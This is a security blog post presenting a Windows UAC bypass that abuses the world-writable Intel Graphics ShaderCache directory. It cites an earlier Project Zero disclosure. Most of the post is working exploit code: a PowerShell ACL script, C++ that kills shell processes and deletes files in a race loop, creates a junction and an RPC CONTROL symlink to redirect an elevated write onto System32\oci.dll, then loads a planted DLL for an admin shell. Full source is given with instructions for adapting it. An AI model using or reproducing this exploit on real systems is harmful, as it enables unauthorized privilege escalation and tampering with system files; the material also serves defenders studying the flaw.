---
title:  "Bypassing UAC via Intel ShaderCache Directory"
header:
  teaser: "/assets/images/c2_part3.png"
categories:
  - UAC Bypass
tags:
  - Intel 
  - ShaderCache
  - Junction
  - migrate
  - uac bypass
  - '2025'
  - g3tsyst3m
  - Blog
  - DIY
---

I'll readily admit my discord server inspired this most recent research into a sort of newly discovered UAC bypass! 😸 I see a lot of convos in the discord server about privilege escalation and I got the itch to research more new-ish UAC bypass methods.  I say it's sort of new, because...well just read on, you'll see soon enough.  

Without further ado, I give you the Intel Graphics Driver ShaderCache directory UAC bypass.  This directory is used by the Intel Graphics driver when you load GUI driven programs, such as a browser, Discord, task manager, etc.  If you have an Intel Graphics card, you're in luck (well, if you're a pentester 😜) I'd say there's a high chance you have this folder on your computer.  

![image](https://github.com/user-attachments/assets/287a3ff4-0b10-4a51-8d82-7e5de3a44653)

Now you may be thinking to yourself,"Why didn't he disclose this?"  Good question.  The reason I didn't disclose it is because it seems to have already been disclosed back in 2019, yet the vulnerability remains.  Why?  Not sure.  But I'm not going to reinvent the wheel and resubmit it. 😛  Here's the original disclosure for those interested:

[Original Vulnerability Disclosure](https://project-zero.issues.chromium.org/issues/42451089)

So, in short this UAC Bypass involves taking advantage of the fact that auto-elevated processes write to it, such as the Task Manager.  It's also a directory, including files within the directory, that we have permissions to manage.  Notice the Authenticated Users group with Full Control?  Yeah, I was just as surprised as you are, trust me! 😺  Btw, the Guests group also has full control privileges.  I couldn't believe my eyes! 👀

![image](https://github.com/user-attachments/assets/478bf081-dde7-438d-853e-130ec44a84f7)

The bulk of this exploit is fairly trivial if you're familiar with how arbitrary write + junctions work.  The portion of the exploit that took me the longest to pull off was deleting all the files actively being used by processes using the Intel Graphics driver.  I ended up changing the security to all the files to read-only where no process could write to existing files, per the original disclosure.  

```ps1
$target = "C:\Users\robbi\AppData\LocalLow\Intel\ShaderCache"

# 2. Remove inheritance and wipe existing permissions
icacls $target /inheritance:r /T
icacls $target /remove:g "ANONYMOUS LOGON" "Guests" "Administrators" /T

# 3. Grant minimal permissions to the folder and subfolders
# (CI) - Container Inherit (subfolders)
# (OI) - Object Inherit (files)
# This only affects ACL propagation
icacls $target /grant:r "Authenticated Users:(OI)(CI)(RX,D)" /T

# 4. Explicitly overwrite ACLs on existing files with only (RX,D)
Get-ChildItem $target -Recurse -File | ForEach-Object {
    icacls $_.FullName /inheritance:r
    icacls $_.FullName /grant:r "Authenticated Users:(RX,D)"
}
```

Then, I proceeded to delete what I could.  I kept running into a brick wall and almost concluded this exploit as requiring a reboot.  But I was determined to pull this off without a reboot, and my persistence paid off!

![image](https://github.com/user-attachments/assets/77b3326c-2c5f-40f2-93c0-58119cf90b3d)

The other hurdle I ran into was the fact I couldn't close TaskManager after spawning it using `taskkill /F`.  Why?  Because I'm a standard user trying to kill an elevated process.  But after further research, I managed to work something out!  You can launch elevated processes that close after a set timeout period.  Problem solved!  Check out the code snippet below to see what I'm talking about:

```cpp

bool LaunchElevatedProcessWithTimeout(LPCWSTR executable, LPCWSTR parameters, DWORD timeout_ms)
{
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";  
    sei.lpFile = executable;
    sei.lpParameters = parameters;
    sei.nShow = SW_SHOWNORMAL;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;

    if (!ShellExecuteExW(&sei))
    {
        DWORD err = GetLastError();
        std::wcerr << L"Failed to launch elevated process. Error: " << err << std::endl;
        return false;
    }

    if (sei.hProcess != NULL)
    {
        DWORD wait_result = WaitForSingleObject(sei.hProcess, timeout_ms);

        if (wait_result == WAIT_TIMEOUT)
        {
            std::wcout << L"Process exceeded timeout, terminating..." << std::endl;
            TerminateProcess(sei.hProcess, 1); 
        }
        else
        {
            std::wcout << L"Process exited within timeout." << std::endl;
        }

        CloseHandle(sei.hProcess);
    }

    return true;
}

LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\taskmgr.exe", L"", 3000);
```

The final piece to the puzzle was deleting all the files that were being created by processes that the Intel driver worked with.  I basically setup a loop that continued to check if certain procesces were still running and if so, kill them and try and delete files in the directory.  I also placed a check for when the directory is empty, which at that point means we can create our junction!  This is a race condition btw, as we have to be quick to create our junction since `sihost.exe` and `ShellHost.exe` are constantly writing to this directory.  😆

```cpp
void checkdir()
{
    std::wstring dir = L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache";

    WinExec("cmd.exe /c TASKKILL /F /IM explorer.exe", 0);
    Sleep(500);
    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);

    WinExec("cmd.exe /c TASKKILL /F /IM sihost.exe", 0);
    Sleep(500);
    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);

    WinExec("cmd.exe /c TASKKILL /F /IM ShellHost.exe", 0);
    Sleep(500);
    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);

    WinExec("cmd.exe /c TASKKILL /F /IM ApplicationFrameHost.exe", 0);
    Sleep(500);
    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
    
    std::wstring checkEmpty = GetMostRecentFile(dir);

    if (checkEmpty.empty()) {
        std::wcerr << L"Good news! No files found in the directory :)  Deleting directory and creating the junction!\n";
        WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
        Sleep(1000);
    }
    else {
        std::wcout << L"There are still files...continuing to kill tasks and delete stuff...Remaining file: " << checkEmpty << std::endl;
        Sleep(1000);
        checkdir();
    }
}
```

There's another element to this exploit I should mention is also required.  Not only are we creating a junction, but we will also be performing an arbitrary write where we redirect a file create / file write operation to a directory and file of our choosing after creating the junction.  But in order to do so, we need to know the name of a file that gets created by the Intel driver in advance.  That was another tricky aspect of this exploit, I'll admit.  Why is it tricky?  Well, the filename is random...sort of.  It changes after logoff and rebooting the machine.  Here's how I addressed that issue.  I kickoff an instance of Task Manager which is autoelevated, and Taskmanager immediately starts writing to the ShaderCache directory.  I get the most recent file written to the directory, which in this case, would be the file(s) written by TaskManager.  I then save that to a `.txt` file to read later.  Check it out:  

```cpp
std::wstring GetMostRecentFile(const std::wstring& directoryPath) {
    namespace fs = std::filesystem;

    std::wstring mostRecentFile;
    fs::file_time_type latestTime;

    for (const auto& entry : fs::directory_iterator(directoryPath)) {
        if (!entry.is_regular_file()) continue;

        auto ftime = entry.last_write_time();
        if (mostRecentFile.empty() || ftime > latestTime) {
            latestTime = ftime;
            mostRecentFile = entry.path().filename().wstring();
        }
    }

    return mostRecentFile;
}

std::wstring dir = L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache";
initialcheck = GetMostRecentFile(dir);
```

BAM!  At this point, I have all that I need to:

- Change permissions on all files to read-only and create a loop to identify and continue to kill all processes still using files in our ShaderCache directory, and then delete all files in the direcory 
- Create a Junction
- Redirect the most recent file written to the directory by TaskManager to a destination we configure (I'll showcase that soon)
- Overwrite this file (I use copy /F myfile c:/windows/system32/destfile)
- Execute the file and bypass UAC!  Teaser alert:  I copy a DLL that executes cmd.exe

Let's continue shall we?  I'll go ahead and create the Junction, like so:

```cpp
void CreateJunction(LPCWSTR linkDir, LPCWSTR targetDir)
{
    HANDLE hFile;
    REPARSE_DATA_BUFFER* reparseData;
    DWORD bytesReturned;
    size_t targetLength;

    // Create the directory for the junction if it doesn't exist
    CreateDirectory(linkDir, NULL);

    // Open the directory
    hFile = CreateFile(linkDir, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open directory: " << GetLastError() << std::endl;
        return;
    }

    targetLength = wcslen(targetDir) * sizeof(WCHAR);
    reparseData = (REPARSE_DATA_BUFFER*)malloc(REPARSE_DATA_BUFFER_HEADER_SIZE + targetLength + 12);
    if (!reparseData) {
        std::cerr << "Failed to allocate memory." << std::endl;
        CloseHandle(hFile);
        return;
    }

    memset(reparseData, 0, REPARSE_DATA_BUFFER_HEADER_SIZE + targetLength + 12);
    reparseData->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    reparseData->ReparseDataLength = (USHORT)(targetLength + 12);
    reparseData->Reserved = 0;

    reparseData->MountPointReparseBuffer.SubstituteNameOffset = 0;
    reparseData->MountPointReparseBuffer.SubstituteNameLength = (USHORT)targetLength;
    reparseData->MountPointReparseBuffer.PrintNameOffset = (USHORT)(targetLength + sizeof(WCHAR));
    reparseData->MountPointReparseBuffer.PrintNameLength = 0;
    memcpy(reparseData->MountPointReparseBuffer.PathBuffer, targetDir, targetLength);

    // Set the reparse point
    if (!DeviceIoControl(hFile, FSCTL_SET_REPARSE_POINT, reparseData, REPARSE_DATA_BUFFER_HEADER_SIZE + reparseData->ReparseDataLength, NULL, 0, &bytesReturned, NULL)) {
        std::cerr << "Failed to set reparse point: " << GetLastError() << std::endl;
    }
    else {
        std::cout << "Junction created successfully." << std::endl;
    }

    free(reparseData);
    CloseHandle(hFile);
}

 // Create the junction
 CreateJunction(L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", L"\\??\\GLOBALROOT\\RPC CONTROL");

 std::wifstream inFile(L"c:\\users\\public\\recent.txt");

 if (inFile) {
     std::getline(inFile, recentFile); 
     inFile.close();

     std::wcout << L"Value read from file: " << recentFile << std::endl;
 }
 else {
     std::wcerr << L"Failed to open recent.txt\n";
 }
```

Next, I'll create an Object Based symlink.  An object-based symlink (short for object manager-based symbolic link) is a type of symbolic link in Windows that exists within the Windows Object Manager namespace rather than the traditional file system.  It's nice because you can create links using the RPC CONTROL global object without requiring administrator privileges to do so.

```cpp
BOOL CreateDosDevice(LPCWSTR deviceName, LPCWSTR targetPath) {
    if (DefineDosDevice(DDD_RAW_TARGET_PATH, deviceName, targetPath)) {
        std::wcout << L"Created DosDevice: " << deviceName << L" -> " << targetPath << std::endl;
        return TRUE;
    }
    else {
        std::cerr << "Failed to create DosDevice: " << GetLastError() << std::endl;
        return FALSE;
    }
}

std::wstring dosDeviceName = L"Global\\GLOBALROOT\\RPC CONTROL\\" + recentFile;

if (CreateDosDevice(dosDeviceName.c_str(), dllTarget.c_str())) {
    std::wcout << L"Symlink created: " << dosDeviceName << L" -> " << dllTarget << std::endl;
    
}
else {
    std::wcerr << L"CreateDosDevice failed: " << GetLastError() << std::endl;
    return 1;
}
```

Lastly, we launch TaskManager again to create the dummy file that we plan to take advantage of. The file get's created, and the following takes place:

- The dummy file is written to `C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\4acae28c94cad7a0b8f78d11fefc67ef3b8cd41ecba3ad1a9da81873fb4c56f8` and then redirected to `c:\\windows\\system32\\oci.dll`
- I have my own custom made oci.dll DLL file we will use that I created.  It just simply opens cmd.exe
- We copy my custom oci.dll file and overwrite the one in System32 that we now have the ability to write to.
- ComExp.msc (Component Services) uses this DLL file so we just run comexp.msc and our payload gets loaded and the rest is history!

```cpp
 LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\taskmgr.exe", L"", 3000); 

 WinExec("cmd.exe /c copy /Y c:\\myfolder\\oci.dll c:\\windows\\system32\\oci.dll", 0); //overwrite dummy file with our file
 Sleep(3000);
 WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
 std::cout << "Launching admin shell!\n";
 LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\comexp.msc", L"", 3000); 
 std::cout << "[+] Cleanup: removing oci.dll to prevent unwanted issues with other exe's that want to load it\n";
 Sleep(1000);
 WinExec("cmd.exe /c del /F /Q C:\\Windows\\System32\\oci.dll", 0);
 return 0;
```

**Full Source Code below (obviously change my username to your own when you use this, as well as the .ps1 script above):**

```cpp

#include <windows.h>
#include <iostream>
#include <filesystem>
#include <fstream>
#include <string>
#include <chrono>

#pragma comment(lib, "user32.lib")
#define REPARSE_DATA_BUFFER_HEADER_SIZE   FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer)

typedef struct _REPARSE_DATA_BUFFER {
    DWORD  ReparseTag;
    WORD   ReparseDataLength;
    WORD   Reserved;
    union {
        struct {
            WORD   SubstituteNameOffset;
            WORD   SubstituteNameLength;
            WORD   PrintNameOffset;
            WORD   PrintNameLength;
            DWORD  Flags;
            WCHAR  PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            WORD   SubstituteNameOffset;
            WORD   SubstituteNameLength;
            WORD   PrintNameOffset;
            WORD   PrintNameLength;
            WCHAR  PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            BYTE   DataBuffer[1];
        } GenericReparseBuffer;
    };
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;

std::wstring GetMostRecentFile(const std::wstring& directoryPath) {
    namespace fs = std::filesystem;

    std::wstring mostRecentFile;
    fs::file_time_type latestTime;

    for (const auto& entry : fs::directory_iterator(directoryPath)) {
        if (!entry.is_regular_file()) continue;

        auto ftime = entry.last_write_time();
        if (mostRecentFile.empty() || ftime > latestTime) {
            latestTime = ftime;
            mostRecentFile = entry.path().filename().wstring();
        }
    }

    return mostRecentFile;
}

void CreateJunction(LPCWSTR linkDir, LPCWSTR targetDir)
{
    HANDLE hFile;
    REPARSE_DATA_BUFFER* reparseData;
    DWORD bytesReturned;
    size_t targetLength;

    // Create the directory for the junction if it doesn't exist
    CreateDirectory(linkDir, NULL);

    // Open the directory
    hFile = CreateFile(linkDir, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open directory: " << GetLastError() << std::endl;
        return;
    }

    targetLength = wcslen(targetDir) * sizeof(WCHAR);
    reparseData = (REPARSE_DATA_BUFFER*)malloc(REPARSE_DATA_BUFFER_HEADER_SIZE + targetLength + 12);
    if (!reparseData) {
        std::cerr << "Failed to allocate memory." << std::endl;
        CloseHandle(hFile);
        return;
    }

    memset(reparseData, 0, REPARSE_DATA_BUFFER_HEADER_SIZE + targetLength + 12);
    reparseData->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    reparseData->ReparseDataLength = (USHORT)(targetLength + 12);
    reparseData->Reserved = 0;

    reparseData->MountPointReparseBuffer.SubstituteNameOffset = 0;
    reparseData->MountPointReparseBuffer.SubstituteNameLength = (USHORT)targetLength;
    reparseData->MountPointReparseBuffer.PrintNameOffset = (USHORT)(targetLength + sizeof(WCHAR));
    reparseData->MountPointReparseBuffer.PrintNameLength = 0;
    memcpy(reparseData->MountPointReparseBuffer.PathBuffer, targetDir, targetLength);

    // Set the reparse point
    if (!DeviceIoControl(hFile, FSCTL_SET_REPARSE_POINT, reparseData, REPARSE_DATA_BUFFER_HEADER_SIZE + reparseData->ReparseDataLength, NULL, 0, &bytesReturned, NULL)) {
        std::cerr << "Failed to set reparse point: " << GetLastError() << std::endl;
    }
    else {
        std::cout << "Junction created successfully." << std::endl;
    }

    free(reparseData);
    CloseHandle(hFile);
}

BOOL CreateDosDevice(LPCWSTR deviceName, LPCWSTR targetPath) {
    if (DefineDosDevice(DDD_RAW_TARGET_PATH, deviceName, targetPath)) {
        std::wcout << L"Created DosDevice: " << deviceName << L" -> " << targetPath << std::endl;
        return TRUE;
    }
    else {
        std::cerr << "Failed to create DosDevice: " << GetLastError() << std::endl;
        return FALSE;
    }
}

bool LaunchElevatedProcessWithTimeout(LPCWSTR executable, LPCWSTR parameters, DWORD timeout_ms)
{
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";  
    sei.lpFile = executable;
    sei.lpParameters = parameters;
    sei.nShow = SW_SHOWNORMAL;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;

    if (!ShellExecuteExW(&sei))
    {
        DWORD err = GetLastError();
        std::wcerr << L"Failed to launch elevated process. Error: " << err << std::endl;
        return false;
    }

    if (sei.hProcess != NULL)
    {
        DWORD wait_result = WaitForSingleObject(sei.hProcess, timeout_ms);

        if (wait_result == WAIT_TIMEOUT)
        {
            std::wcout << L"Process exceeded timeout, terminating..." << std::endl;
            TerminateProcess(sei.hProcess, 1); 
        }
        else
        {
            std::wcout << L"Process exited within timeout." << std::endl;
        }

        CloseHandle(sei.hProcess);
    }

    return true;
}

void checkdir()
{
    std::wstring dir = L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache";

    WinExec("cmd.exe /c TASKKILL /F /IM explorer.exe", 0);
    Sleep(500);
    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);

    WinExec("cmd.exe /c TASKKILL /F /IM sihost.exe", 0);
    Sleep(500);
    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);

    WinExec("cmd.exe /c TASKKILL /F /IM ShellHost.exe", 0);
    Sleep(500);
    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);

    WinExec("cmd.exe /c TASKKILL /F /IM ApplicationFrameHost.exe", 0);
    Sleep(500);
    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
    
    std::wstring checkEmpty = GetMostRecentFile(dir);

    if (checkEmpty.empty()) {
        std::wcerr << L"Good news! No files found in the directory :)  Deleting directory and creating the junction!\n";
        WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
        Sleep(1000);
    }
    else {
        std::wcout << L"There are still files...continuing to kill tasks and delete stuff...Remaining file: " << checkEmpty << std::endl;
        Sleep(1000);
        checkdir();
    }
}

int wmain() {
    std::cout << "********************************\nIMPORTANT\n********************************\n";
    std::cout << "Before continuing, make sure ALL Desktop apps with a GUI are closed.  This includes browsers, notepad, discord, etc\n";
    std::cout << "The tool is only accounting for built in windows processes that have handles to files in the shadowcache directory\n";
    std::cout << "Press [ENTER] to continue...\n";
    std::cin.get();
    std::wstring recentFile, initialcheck;
    std::wstring dllTarget = L"\\??\\C:\\Windows\\System32\\oci.dll";

    LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\taskmgr.exe", L"", 3000); 

    std::wstring dir = L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache";
    initialcheck = GetMostRecentFile(dir);

    if (initialcheck.empty()) {
        std::wcerr << L"Good news! No files found in the directory.\n";
    }
    else {
        std::wcout << L"Most recent file: " << initialcheck << std::endl;

        // Write to text file
        std::wofstream outFile(L"c:\\users\\public\\recent.txt");
        if (outFile) {
            outFile << initialcheck;
            outFile.close();
        }
        else {
            std::wcerr << L"Failed to write to recent.txt\n";
        }
    }
    WinExec("powershell.exe -ExecutionPolicy Bypass -File c:\\users\\robbi\\Desktop\\intel_uacbypass_prep.ps1", 0);

    Sleep(3000);

    WinExec("cmd.exe /c TASKKILL /F /IM explorer.exe", 0);
    Sleep(500);
    checkdir();

    // Create the junction
    CreateJunction(L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", L"\\??\\GLOBALROOT\\RPC CONTROL");

    std::wifstream inFile(L"c:\\users\\public\\recent.txt");

    if (inFile) {
        std::getline(inFile, recentFile); 
        inFile.close();

        std::wcout << L"Value read from file: " << recentFile << std::endl;
    }
    else {
        std::wcerr << L"Failed to open recent.txt\n";
    }

    std::wstring dosDeviceName = L"Global\\GLOBALROOT\\RPC CONTROL\\" + recentFile;

    if (CreateDosDevice(dosDeviceName.c_str(), dllTarget.c_str())) {
        std::wcout << L"Symlink created: " << dosDeviceName << L" -> " << dllTarget << std::endl;
        
    }
    else {
        std::wcerr << L"CreateDosDevice failed: " << GetLastError() << std::endl;
        return 1;
    }

    LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\taskmgr.exe", L"", 3000); 
   
    WinExec("cmd.exe /c copy /Y c:\\myfolder\\oci.dll c:\\windows\\system32\\oci.dll", 0); //overwrite dummy file with our file
    Sleep(3000);
    WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
    std::cout << "Launching admin shell!\n";
    LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\comexp.msc", L"", 3000); 
    std::cout << "[+] Cleanup: removing oci.dll to prevent unwanted issues with other exe's that want to load it\n";
    Sleep(1000);
    WinExec("cmd.exe /c del /F /Q C:\\Windows\\System32\\oci.dll", 0);
    return 0;
}
```

I realize it's a lot of code, but hey, it gets the job done and it's sort of a novel UAC bypass.  Take it or leave it, I certainly learned a lot revisiting junctions, arbitrary write vulnerabilities, race conditions, and how to terminate an auto-elevated process without being an administrator.  Enjoy!

